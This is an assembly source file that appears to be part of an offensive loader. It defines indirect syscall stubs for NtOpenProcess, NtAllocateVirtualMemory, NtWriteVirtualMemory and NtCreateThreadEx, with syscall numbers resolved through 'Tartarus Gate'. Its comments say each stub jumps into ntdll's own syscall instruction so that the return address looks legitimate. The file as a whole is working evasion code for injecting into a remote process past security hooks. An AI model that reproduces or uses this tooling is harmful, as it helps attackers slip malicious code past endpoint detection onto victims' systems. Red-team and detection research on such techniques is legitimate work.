; syscalls.asm  -  MASM x64 indirect syscall stubs
;
; Each stub follows the Windows x64 syscall ABI:
;   1. mov r10, rcx           first argument shifts to r10
;   2. mov eax, [ssn_global]  SSN resolved at runtime by Tartarus Gate
;   3. jmp [g_pGadget]        indirect: execution enters ntdll's own
;                              "syscall; ret" sequence, so the kernel
;                              sees the return address inside ntdll - not
;                              inside our binary.
;
; Globals (DWORD SSNs + QWORD gadget) are declared here and written
; from C after Tartarus Gate resolution.
;
; Compile:  ml64 /c syscalls.asm  (MSVC x64 developer prompt)

.data

PUBLIC g_ssnNtOpenProcess
PUBLIC g_ssnNtAllocateVirtualMemory
PUBLIC g_ssnNtWriteVirtualMemory
PUBLIC g_ssnNtCreateThreadEx
PUBLIC g_pGadget

g_ssnNtOpenProcess           DWORD 0
g_ssnNtAllocateVirtualMemory DWORD 0
g_ssnNtWriteVirtualMemory    DWORD 0
g_ssnNtCreateThreadEx        DWORD 0
g_pGadget                    QWORD 0

.code

; ── NtOpenProcess ──────────────────────────────────────────────────────────
; NTSTATUS NtOpenProcess(
;     PHANDLE ProcessHandle,       rcx
;     ACCESS_MASK DesiredAccess,   rdx
;     POBJECT_ATTRIBUTES ObjAttr,  r8
;     PCLIENT_ID ClientId          r9  )

ZwOpenProcess PROC
    mov  r10, rcx
    mov  eax, dword ptr [g_ssnNtOpenProcess]
    jmp  qword ptr [g_pGadget]
ZwOpenProcess ENDP

; ── NtAllocateVirtualMemory ────────────────────────────────────────────────
; NTSTATUS NtAllocateVirtualMemory(
;     HANDLE ProcessHandle,        rcx
;     PVOID *BaseAddress,          rdx
;     ULONG_PTR ZeroBits,          r8
;     PSIZE_T RegionSize,          r9
;     ULONG AllocationType,        [rsp+0x28]
;     ULONG Protect )              [rsp+0x30]

ZwAllocateVirtualMemory PROC
    mov  r10, rcx
    mov  eax, dword ptr [g_ssnNtAllocateVirtualMemory]
    jmp  qword ptr [g_pGadget]
ZwAllocateVirtualMemory ENDP

; ── NtWriteVirtualMemory ──────────────────────────────────────────────────
; NTSTATUS NtWriteVirtualMemory(
;     HANDLE ProcessHandle,        rcx
;     PVOID BaseAddress,           rdx
;     PVOID Buffer,                r8
;     SIZE_T NumberOfBytesToWrite, r9
;     PSIZE_T BytesWritten )       [rsp+0x28]

ZwWriteVirtualMemory PROC
    mov  r10, rcx
    mov  eax, dword ptr [g_ssnNtWriteVirtualMemory]
    jmp  qword ptr [g_pGadget]
ZwWriteVirtualMemory ENDP

; ── NtCreateThreadEx ──────────────────────────────────────────────────────
; NTSTATUS NtCreateThreadEx(
;     PHANDLE ThreadHandle,        rcx
;     ACCESS_MASK DesiredAccess,   rdx
;     POBJECT_ATTRIBUTES ObjAttr,  r8   (NULL)
;     HANDLE ProcessHandle,        r9
;     PVOID StartRoutine,          [rsp+0x28]
;     PVOID Argument,              [rsp+0x30]
;     ULONG CreateFlags,           [rsp+0x38]
;     SIZE_T ZeroBits,             [rsp+0x40]
;     SIZE_T StackSize,            [rsp+0x48]
;     SIZE_T MaximumStackSize,     [rsp+0x50]
;     PPS_ATTRIBUTE_LIST AttrList) [rsp+0x58]

ZwCreateThreadEx PROC
    mov  r10, rcx
    mov  eax, dword ptr [g_ssnNtCreateThreadEx]
    jmp  qword ptr [g_pGadget]
ZwCreateThreadEx ENDP

END
